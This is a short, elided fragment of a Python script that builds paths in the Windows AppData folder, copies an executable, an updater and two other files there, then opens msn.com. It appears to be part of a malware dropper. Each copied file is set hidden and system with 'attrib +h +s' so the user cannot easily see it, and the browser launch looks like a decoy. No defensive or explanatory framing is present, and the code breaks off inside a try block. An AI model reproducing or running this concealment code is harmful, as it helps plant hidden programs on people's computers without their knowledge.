...
destination_path_exe = os.path.join(appdata_path, source_path_exe)
destination_updater = os.path.join(appdata_path, source_updater)
dest_imshow = os.path.join(appdata_path, imshow)
dest_vidshow = os.path.join(appdata_path, vidshow)
...
try:
    ...
    shutil.copy(imshow, dest_imshow)
    print(f"File copied from {imshow} to {dest_imshow}")
    subprocess.run(["attrib","+h","+s",dest_imshow],shell=True) 

    shutil.copy(vidshow, dest_vidshow)
    print(f"File copied from {vidshow} to {dest_vidshow}")
    subprocess.run(["attrib","+h","+s",dest_vidshow],shell=True)


    open_t("https://msn.com")
